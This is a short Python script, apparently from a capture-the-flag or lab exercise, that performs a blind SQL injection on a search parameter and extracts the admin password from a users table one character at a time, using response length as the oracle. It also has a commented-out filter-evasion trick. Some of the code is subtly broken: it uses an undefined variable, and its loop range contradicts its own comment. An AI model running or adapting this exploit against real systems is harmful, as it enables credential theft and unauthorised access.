# The password we are retriving contains all character from 123456789abcdef
def sqli(inj):
    strings = "123456789abcdef"
    for i in strings:
#         a = "Hack\')/**/{}/**/;/**/%23".format(inj.replace(' ','/**/'))
        payload = inj.replace('[CHAR]',i)
        url = "http://IP/?search=" + pay
        r = requests.get(url)
        if int(r.headers['content-length']) > 3000:
            return i
    return None

  
# the retrived password is 42 char long that's why the range is 1,41
extracted = ''
for i in range(1,41):
    inj ="OR (SELECT SUBSTR((select password from users where login='admin'),%d,1)= '[CHAR]')" % i
    extracted += sqli(inj)
    
print(extracted)
